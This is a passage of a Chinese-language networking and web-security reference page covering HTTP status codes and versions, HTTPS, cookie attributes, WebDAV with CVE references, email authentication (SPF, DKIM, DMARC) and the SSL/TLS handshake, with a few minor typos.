<tr class="row-odd"><th class="head">Code</th>
<th class="head">代码</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>200</td>
<td>成功</td>
<td>服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页</td>
</tr>
<tr class="row-odd"><td>201</td>
<td>已创建</td>
<td>请求成功并且服务器创建了新的资源</td>
</tr>
<tr class="row-even"><td>202</td>
<td>已接受</td>
<td>服务器已接受请求，但尚未处理</td>
</tr>
<tr class="row-odd"><td>203</td>
<td>非授权信息</td>
<td>服务器已成功处理了请求，但返回的信息可能来自另一来源</td>
</tr>
<tr class="row-even"><td>204</td>
<td>无内容</td>
<td>服务器成功处理了请求，但没有返回任何内容</td>
</tr>
<tr class="row-odd"><td>205</td>
<td>重置内容</td>
<td>m服务器成功处理了请求，但没有返回任何内容</td>
</tr>
<tr class="row-even"><td>206</td>
<td>部分内容</td>
<td>服务器成功处理了部分GET请求</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="http-3xx">
<h5>HTTP状态返回代码 3xx （重定向）<a class="headerlink" href="#http-3xx" title="永久链接至标题">¶</a></h5>
<p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p>
<table border="1" class="docutils">
<colgroup>
<col width="4%" />
<col width="10%" />
<col width="87%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Code</th>
<th class="head">代码</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>300</td>
<td>多种选择</td>
<td>针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td>
</tr>
<tr class="row-odd"><td>301</td>
<td>永久移动</td>
<td>请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</td>
</tr>
<tr class="row-even"><td>302</td>
<td>临时移动</td>
<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
<tr class="row-odd"><td>303</td>
<td>查看其他位置</td>
<td>请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td>
</tr>
<tr class="row-even"><td>304</td>
<td>未修改</td>
<td>自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</td>
</tr>
<tr class="row-odd"><td>305</td>
<td>使用代理</td>
<td>请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。</td>
</tr>
<tr class="row-even"><td>307</td>
<td>临时重定向</td>
<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="http-4xx">
<h5>HTTP状态返回代码 4xx（请求错误）<a class="headerlink" href="#http-4xx" title="永久链接至标题">¶</a></h5>
<p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>
<table border="1" class="docutils">
<colgroup>
<col width="5%" />
<col width="19%" />
<col width="75%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Code</th>
<th class="head">代码</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>400</td>
<td>错误请求</td>
<td>服务器不理解请求的语法。</td>
</tr>
<tr class="row-odd"><td>401</td>
<td>未授权</td>
<td>请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。</td>
</tr>
<tr class="row-even"><td>403</td>
<td>禁止</td>
<td>服务器拒绝请求。</td>
</tr>
<tr class="row-odd"><td>404</td>
<td>未找到</td>
<td>服务器找不到请求的网页。</td>
</tr>
<tr class="row-even"><td>405</td>
<td>方法禁用</td>
<td>禁用请求中指定的方法。</td>
</tr>
<tr class="row-odd"><td>406</td>
<td>不接受</td>
<td>无法使用请求的内容特性响应请求的网页。</td>
</tr>
<tr class="row-even"><td>407</td>
<td>需要代理授权</td>
<td>此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td>
</tr>
<tr class="row-odd"><td>408</td>
<td>请求超时</td>
<td>服务器等候请求时发生超时。</td>
</tr>
<tr class="row-even"><td>409</td>
<td>冲突</td>
<td>服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td>
</tr>
<tr class="row-odd"><td>410</td>
<td>已删除</td>
<td>如果请求的资源已永久删除，服务器就会返回此响应。</td>
</tr>
<tr class="row-even"><td>411</td>
<td>需要有效长度</td>
<td>服务器不接受不含有效内容长度标头字段的请求。</td>
</tr>
<tr class="row-odd"><td>412</td>
<td>未满足前提条件</td>
<td>服务器未满足请求者在请求中设置的其中一个前提条件。</td>
</tr>
<tr class="row-even"><td>413</td>
<td>请求实体过大</td>
<td>服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td>
</tr>
<tr class="row-odd"><td>414</td>
<td>请求的 URI 过长</td>
<td>请求的 URI（通常为网址）过长，服务器无法处理。</td>
</tr>
<tr class="row-even"><td>415</td>
<td>不支持的媒体类型</td>
<td>请求的格式不受请求页面的支持。</td>
</tr>
<tr class="row-odd"><td>416</td>
<td>请求范围不符合要求</td>
<td>如果页面无法提供请求的范围，则服务器会返回此状态代码。</td>
</tr>
<tr class="row-even"><td>417</td>
<td>未满足期望值</td>
<td>服务器未满足&quot;期望&quot;请求标头字段的要求。</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="http-5xx">
<h5>HTTP状态返回代码 5xx（服务器错误）<a class="headerlink" href="#http-5xx" title="永久链接至标题">¶</a></h5>
<p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p>
<table border="1" class="docutils">
<colgroup>
<col width="5%" />
<col width="17%" />
<col width="78%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">Code</th>
<th class="head">代码</th>
<th class="head">说明</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>500</td>
<td>服务器内部错误</td>
<td>服务器遇到错误，无法完成请求。</td>
</tr>
<tr class="row-odd"><td>501</td>
<td>尚未实施</td>
<td>服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。</td>
</tr>
<tr class="row-even"><td>502</td>
<td>错误网关</td>
<td>服务器作为网关或代理，从上游服务器收到无效响应。</td>
</tr>
<tr class="row-odd"><td>503</td>
<td>服务不可用</td>
<td>服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td>
</tr>
<tr class="row-even"><td>504</td>
<td>网关超时</td>
<td>服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td>
</tr>
<tr class="row-odd"><td>505</td>
<td>HTTP 版本不受支持</td>
<td>服务器不支持请求中所用的 HTTP 协议版本。</td>
</tr>
</tbody>
</table>
</div>
</div>
<span id="document-network/http/httpver"></span><div class="section" id="http">
<h4>HTTP 版本<a class="headerlink" href="#http" title="永久链接至标题">¶</a></h4>
<div class="section" id="hhttp">
<h5>HHTTP<a class="headerlink" href="#hhttp" title="永久链接至标题">¶</a></h5>
<p>HTTP 是基于 TCP/IP 协议的应用层协议，主要规定了客户端和服务器之间的通信格式，默认使用80端口。</p>
</div>
<div class="section" id="http-0-9">
<h5>HTTP 0.9<a class="headerlink" href="#http-0-9" title="永久链接至标题">¶</a></h5>
<p>HTTP 0.9最早在1991年发布，仅支持GET命令，请求格式只有简单的 <code class="docutils literal notranslate"><span class="pre">GET</span> <span class="pre">/url</span></code> ，服务端仅响应HTML，响应完毕后关闭TCP连接。</p>
</div>
<div class="section" id="http-1-0">
<h5>HTTP 1.0<a class="headerlink" href="#http-1-0" title="永久链接至标题">¶</a></h5>
<p>1996年5月，HTTP/1.0 版本发布，丰富了传输的格式和内容，还引入了POST、HEAD两个动词。从1.0开始，必须在尾部添加协议版本。在1.0中，也引入了状态码(status code)、多字符集支持、多部分发送(multi-part type)、权限(authorization)、缓存(cache)、内容编码(content encoding)等内容。</p>
<p>HTTP 1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。</p>
<p>TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢(slow start)，所以，HTTP 1.0版本的性能比较差。</p>
</div>
<div class="section" id="http-1-1">
<h5>HTTP 1.1<a class="headerlink" href="#http-1-1" title="永久链接至标题">¶</a></h5>
<p>1997年1月，HTTP/1.1 版本发布，进一步完善了 HTTP 协议。1.1版本主要是引入了持久连接、管道机制、Content-Length、分块传输编码等内容。管道机制即在同一个TCP连接里面，客户端可以同时发送多个请求，这样就改进了HTTP协议的效率。PUT、PATCH、HEAD、 OPTIONS、DELETE等动词方法也是在HTTP 1.1版本引入的。另外1.1版本新增了Host字段，用于指定服务器的域名，这也是后来虚拟主机得以发展的基础。</p>
<p>虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。如果有一个请求很慢，就会阻塞后面的请求。</p>
</div>
<div class="section" id="spdy">
<h5>SPDY<a class="headerlink" href="#spdy" title="永久链接至标题">¶</a></h5>
<p>2009年，谷歌公开了自行研发的 SPDY 协议，用于解决 HTTP/1.1 效率不高的问题，而后被当做 HTTP/2 的基础。</p>
</div>
<div class="section" id="http-2">
<h5>HTTP/2<a class="headerlink" href="#http-2" title="永久链接至标题">¶</a></h5>
<p>2015年，HTTP/2 发布，HTTP/2是一个二进制协议，头信息和数据体都是二进制，统称为帧(frame)，帧分为头信息帧和数据帧。HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序回应。</p>
</div>
</div>
<span id="document-network/http/https"></span><div class="section" id="https">
<h4>HTTPS<a class="headerlink" href="#https" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>HTTPS (HyperText Transfer Protocol over Secure Socket Layer)可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL。</p>
</div>
<div class="section" id="id2">
<h5>交互<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id3">
<h6>证书验证阶段<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>浏览器发起 HTTPS 请求</li>
<li><dl class="first docutils">
<dt>服务端返回 HTTPS 证书</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>其中证书包含：</dt>
<dd><ul class="first last">
<li>颁发机构信息</li>
<li>公钥</li>
<li>公司信息</li>
<li>域名</li>
<li>有效期</li>
<li>指纹</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li>客户端验证证书是否合法，如果不合法则提示告警</li>
</ul>
</div>
<div class="section" id="id4">
<h6>数据传输阶段<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>当证书验证合法后，在本地生成随机数</li>
<li>通过公钥加密随机数，并把加密后的随机数传输到服务端</li>
<li>服务端通过私钥对随机数进行解密</li>
<li>服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输</li>
</ul>
</div>
</div>
<div class="section" id="ca">
<h5>CA<a class="headerlink" href="#ca" title="永久链接至标题">¶</a></h5>
<p>CA (Certificate Authority) 是颁发数字证书的机构。是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。</p>
</div>
</div>
<span id="document-network/http/cookie"></span><div class="section" id="cookie">
<h4>Cookie<a class="headerlink" href="#cookie" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>Cookie（复数形态Cookies），类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据。</p>
</div>
<div class="section" id="id2">
<h5>属性<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="name">
<h6>name<a class="headerlink" href="#name" title="永久链接至标题">¶</a></h6>
<p>cookie的名称。</p>
</div>
<div class="section" id="value">
<h6>value<a class="headerlink" href="#value" title="永久链接至标题">¶</a></h6>
<p>cookie的值。</p>
</div>
<div class="section" id="expires">
<h6>expires<a class="headerlink" href="#expires" title="永久链接至标题">¶</a></h6>
<p>当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。</p>
</div>
<div class="section" id="max-age">
<h6>max-age<a class="headerlink" href="#max-age" title="永久链接至标题">¶</a></h6>
<p>max-age 可以为正数、负数、0。如果 max-age 属性为正数时，浏览器会将其持久化，当 max-age 属性为负数，则表示该 Cookie 只是一个会话性 Cookie。当 max-age 为 0 时，则会立即删除这个 Cookie。Expires 和 max-age 都存在的条件下，max-age 优先级更高。</p>
</div>
<div class="section" id="domain">
<h6>domain<a class="headerlink" href="#domain" title="永久链接至标题">¶</a></h6>
<p>指定Cookie的域名，默认是当前域名。domain设置时可以设置为自身及其父域，子域可以访问父域的Cookie，反之不能。</p>
</div>
<div class="section" id="path">
<h6>path<a class="headerlink" href="#path" title="永久链接至标题">¶</a></h6>
<p>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送对应的 Cookie。</p>
</div>
<div class="section" id="secure">
<h6>secure<a class="headerlink" href="#secure" title="永久链接至标题">¶</a></h6>
<p>只能通过 HTTPS 传输。</p>
</div>
<div class="section" id="httponly">
<h6>httponly<a class="headerlink" href="#httponly" title="永久链接至标题">¶</a></h6>
<p>限制Cookie仅在HTTP传输过程中被读取，一定程度上防御XSS攻击。</p>
</div>
<div class="section" id="samesite">
<h6>SameSite<a class="headerlink" href="#samesite" title="永久链接至标题">¶</a></h6>
<p>SameSite 支持 Strict / Lax / None 三种值。Strict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。Lax 允许部分第三方请求携带 Cookie，主要是链接、预加载、GET 表单三种情况。Cookie 的 SameSite 属性为 None ，且设置了 Secure 时，无论是否跨站都会发送 Cookie。</p>
</div>
</div>
</div>
<span id="document-network/http/webdav"></span><div class="section" id="webdav">
<h4>WebDAV<a class="headerlink" href="#webdav" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定、解锁，以及版本控制等功能。</p>
<p>支持的方法具体为：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>OPTIONS</dt>
<dd><ul class="first last">
<li>获取服务器的支持</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>GET / PUT / POST / DELETE</dt>
<dd><ul class="first last">
<li>资源操作</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>TRACE</dt>
<dd><ul class="first last">
<li>跟踪服务器</li>
</ul>
</dd>
</dl>
</li>
<li>HEAD</li>
<li><dl class="first docutils">
<dt>MKCOL</dt>
<dd><ul class="first last">
<li>创建集合</li>
</ul>
</dd>
</dl>
</li>
<li>PROPFIND / PROPPATCH</li>
<li>COPY / MOVE</li>
<li>LOCK / UNLOCK</li>
</ul>
</div>
<div class="section" id="cve">
<h5>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2015-1833</dt>
<dd><ul class="first last">
<li>Apache Jacrabbit WebDav XXE</li>
<li><a class="reference external" href="http://www.securityfocus.com/archive/1/535582">http://www.securityfocus.com/archive/1/535582</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2015-7326</dt>
<dd><ul class="first last">
<li>Milton WebDav XXE</li>
<li><a class="reference external" href="http://www.securityfocus.com/archive/1/536813">http://www.securityfocus.com/archive/1/536813</a></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-network/http/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3253">RFC 3253</a> Versioning Extensions to WebDAV (Web Distributed Authoring and Versioning)</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3648">RFC 3648</a> Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3744">RFC 3744</a> Web Distributed Authoring and Versioning (WebDAV) Access Control Protocol</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4437">RFC 4437</a> Web Distributed Authoring and Versioning (WebDAV) Redirect Reference Resources</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4918">RFC 4918</a> HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV)</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5323">RFC 5323</a> Web Distributed Authoring and Versioning (WebDAV) SEARCH</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5842">RFC 5842</a> Binding Extensions to Web Distributed Authoring and Versioning (WebDAV)</li>
</ul>
</div>
<div class="section" id="blog">
<h5>Blog<a class="headerlink" href="#blog" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://2015.zeronights.org/assets/files/35-Egorov.pdf">What should a hacker know about WebDav</a></li>
<li><a class="reference external" href="http://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html">Cookie 的 SameSite 属性</a></li>
<li><a class="reference external" href="http://www.ruanyifeng.com/blog/2016/08/http.html">HTTP 协议入门</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-network/mail"></span><div class="section" id="id1">
<h3>邮件协议族<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="smtp">
<h5>SMTP<a class="headerlink" href="#smtp" title="永久链接至标题">¶</a></h5>
<p>SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。</p>
</div>
<div class="section" id="pop3">
<h5>POP3<a class="headerlink" href="#pop3" title="永久链接至标题">¶</a></h5>
<p>POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。</p>
</div>
<div class="section" id="imap">
<h5>IMAP<a class="headerlink" href="#imap" title="永久链接至标题">¶</a></h5>
<p>IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用SSL时端口号为143，启用SSL时端口号多为993。</p>
</div>
</div>
<div class="section" id="id3">
<h4>防护策略<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="spf">
<h5>SPF<a class="headerlink" href="#spf" title="永久链接至标题">¶</a></h5>
<p>发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF允许管理员设定一个DNS TXT记录或SPF记录设定发送邮件服务器的IP范围，如有任何邮件并非从上述指明授权的IP地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。</p>
</div>
<div class="section" id="dkim">
<h5>DKIM<a class="headerlink" href="#dkim" title="永久链接至标题">¶</a></h5>
<p>域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入DKIM-Signature，收件方通过查询DNS记录中的公钥来验证发件人的信息。</p>
</div>
<div class="section" id="dmarc">
<h5>DMARC<a class="headerlink" href="#dmarc" title="永久链接至标题">¶</a></h5>
<p>基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或/和 DKIM 的身份验证，且需要标头地址中的域名必须与经过身份验证的域名一致。</p>
</div>
</div>
<div class="section" id="id4">
<h4>参考链接<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4408">RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6376">RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7208">RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7489">RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8301">RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8463">RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8616">RFC 8616 Email Authentication for Internationalized Mail</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8611">RFC 8611 Mail</a></li>
</ul>
</div>
<div class="section" id="id5">
<h5>相关文档<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Sender_Policy_Framework">Sender Policy Framework wikipedia</a></li>
<li><a class="reference external" href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DomainKeys Identified Mail wikipedia</a></li>
<li><a class="reference external" href="https://en.wikipedia.org/wiki/DMARC">DMARC wikipedia</a></li>
</ul>
</div>
<div class="section" id="id6">
<h5>研究文章<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://i.blackhat.com/USA-20/Thursday/us-20-Chen-You-Have-No-Idea-Who-Sent-That-Email-18-Attacks-On-Email-Sender-Authentication-wp.pdf">Composition Kills:A Case Study of Email Sender Authentication</a></li>
</ul>
</div>
</div>
</div>
<span id="document-network/ssl"></span><div class="section" id="ssl-tls">
<h3>SSL/TLS<a class="headerlink" href="#ssl-tls" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>SSL全称是Secure Sockets Layer，安全套接字层，它是由网景公司(Netscape)在1994年时设计，主要用于Web的安全传输协议，目的是为网络通信提供机密性、认证性及数据完整性保障。如今，SSL已经成为互联网保密通信的工业标准。</p>
<p>SSL最初的几个版本(SSL 1.0、SSL2.0、SSL 3.0)由网景公司设计和维护，从3.1版本开始，SSL协议由因特网工程任务小组(IETF)正式接管，并更名为TLS(Transport Layer Security)，发展至今已有TLS 1.0、TLS1.1、TLS1.2、TLS1.3这几个版本。</p>
<p>如TLS名字所说，SSL/TLS协议仅保障传输层安全。同时，由于协议自身特性(数字证书机制)，SSL/TLS不能被用于保护多跳(multi-hop)端到端通信，而只能保护点到点通信。</p>
<p>SSL/TLS协议能够提供的安全目标主要包括如下几个：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>认证性</dt>
<dd><ul class="first last">
<li>借助数字证书认证服务端端和客户端身份，防止身份伪造</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>机密性</dt>
<dd><ul class="first last">
<li>借助加密防止第三方窃听</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>完整性</dt>
<dd><ul class="first last">
<li>借助消息认证码(MAC)保障数据完整性，防止消息篡改</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>重放保护</dt>
<dd><ul class="first last">
<li>通过使用隐式序列号防止重放攻击</li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>为了实现这些安全目标，SSL/TLS协议被设计为一个两阶段协议，分为握手阶段和应用阶段：</p>
<p>握手阶段也称协商阶段，在这一阶段，客户端和服务端端会认证对方身份(依赖于PKI体系，利用数字证书进行身份认证)，并协商通信中使用的安全参数、密码套件以及MasterSecret。后续通信使用的所有密钥都是通过MasterSecret生成。
在握手阶段完成后，进入应用阶段。在应用阶段通信双方使用握手阶段协商好的密钥进行安全通信。</p>
</div>
<div class="section" id="id2">
<h4>协议<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>TLS 包含几个子协议，比较常用的有记录协议、警报协议、握手协议、变更密码规范协议等。</p>
<div class="section" id="id3">
<h5>记录协议<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>记录协议(Record Protocol)规定了 TLS 收发数据的基本单位记录(record)。</p>
</div>
<div class="section" id="id4">
<h5>警报协议<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>警报协议(Alert Protocol)用于提示协议交互过程出现错误。</p>
</div>
<div class="section" id="id5">
<h5>握手协议<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>握手协议(Handshake Protocol)是 TLS 里最复杂的子协议，在握手过程中协商 TLS 版本号、随机数、密码套件等信息，然后交换证书和密钥参数，最终双方协商得到会话密钥，用于后续的混合加密系统。</p>
</div>
<div class="section" id="id6">
<h5>变更密码规范协议<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>变更密码规范协议(Change Cipher Spec Protocol)是一个“通知”，告诉对方，后续的数据都将使用加密保护。</p>
</div>
</div>
<div class="section" id="id7">
<h4>交互过程<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="client-hello">
<h5>Client Hello<a class="headerlink" href="#client-hello" title="永久链接至标题">¶</a></h5>
<p>Client Hello 由客户端发送，内容包括客户端的一个Unix时间戳(GMT Unix Time)、一些随机的字节(Random Bytes)，还包括了客户端接受的算法类型(Cipher Suites)。</p>
</div>
<div class="section" id="server-hello">
<h5>Server Hello<a class="headerlink" href="#server-hello" title="永久链接至标题">¶</a></h5>
<p>Server Hello 由服务端发送，内容包括服务端支持的算法类型、GMT Unix Time以及Random Bytes。</p>
</div>
<div class="section" id="certificate">
<h5>Certificate<a class="headerlink" href="#certificate" title="永久链接至标题">¶</a></h5>
<p>由服务端或者客户端发送，发送方会会将自己的数字证书发送给接收方，由接收方进行证书验证，如果不通过的话，接收方会中断握手的过程。一般跟在Client / Server Hello报文之后。</p>
</div>
<div class="section" id="server-key-exchange">
<h5>Server Key Exchange<a class="headerlink" href="#server-key-exchange" title="永久链接至标题">¶</a></h5>
<p>由服务端发送，将自己的公钥参数传输给了客户端，一般也和Server Hello与Certificate在一个TCP报文中。</p>
</div>
<div class="section" id="server-hello-done">
<h5>Server Hello Done<a class="headerlink" href="#server-hello-done" title="永久链接至标题">¶</a></h5>
<p>服务端发送，一般也和Server Hello、Certificate和Server Key Exchange在一个TCP报文中。</p>
</div>
<div class="section" id="client-key-exchange">
<h5>Client Key Exchange<a class="headerlink" href="#client-key-exchange" title="永久链接至标题">¶</a></h5>
<p>客户端发送，向服务端发送自己的公钥参数，与服务端协商密钥。</p>
</div>
<div class="section" id="change-cipher-spec">
<h5>Change Cipher Spec<a class="headerlink" href="#change-cipher-spec" title="永久链接至标题">¶</a></h5>
<p>客户端或者服务端发送，紧跟着Key Exchange发送，代表自己生成了新的密钥，通知对方以后将更换密钥，使用新的密钥进行通信。</p>
</div>
<div class="section" id="encrypted-handshake-message">
<h5>Encrypted Handshake Message<a class="headerlink" href="#encrypted-handshake-message" title="永久链接至标题">¶</a></h5>
<p>客户端或者服务端发送，紧跟着Key Exchange发送。进行测试，一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方，如果密钥协商正确无误的话，对方可以正确解密。</p>
</div>
<div class="section" id="new-session-ticket">
<h5>New Session Ticket<a class="headerlink" href="#new-session-ticket" title="永久链接至标题">¶</a></h5>
<p>服务端发送，表示发起会话，在一段时间之内(超时时间到来之前)，双方都以刚刚交换的密钥进行通信。从这以后，加密通信正式开始。</p>
</div>
<div class="section" id="application-data">
<h5>Application Data<a class="headerlink" href="#application-data" title="永久链接至标题">¶</a></h5>
<p>使用密钥交换协议协商出来的密钥加密的应用层的数据。</p>
</div>
<div class="section" id="encrypted-alert">
<h5>Encrypted Alert<a class="headerlink" href="#encrypted-alert" title="永久链接至标题">¶</a></h5>
<p>客户端或服务端发送，意味着加密通信因为某些原因需要中断，警告对方不要再发送敏感的数据。</p>
</div>
</div>
<div class="section" id="id8">
<h4>版本更新内容<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<div class="section" id="tls-1-3">
<h5>TLS 1.3<a class="headerlink" href="#tls-1-3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>引入了PSK作为新的密钥协商机制</li>
<li>支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间</li>
<li>ServerHello 之后的所有握手消息采取了加密操作，可见明文减少</li>
<li>不再允许对加密报文进行压缩、不再允许双方发起重协商</li>
<li>DSA 证书不再允许在 TLS 1.3 中使用</li>
<li><dl class="first docutils">
<dt>删除不安全的密码算法</dt>
<dd><ul class="first last">
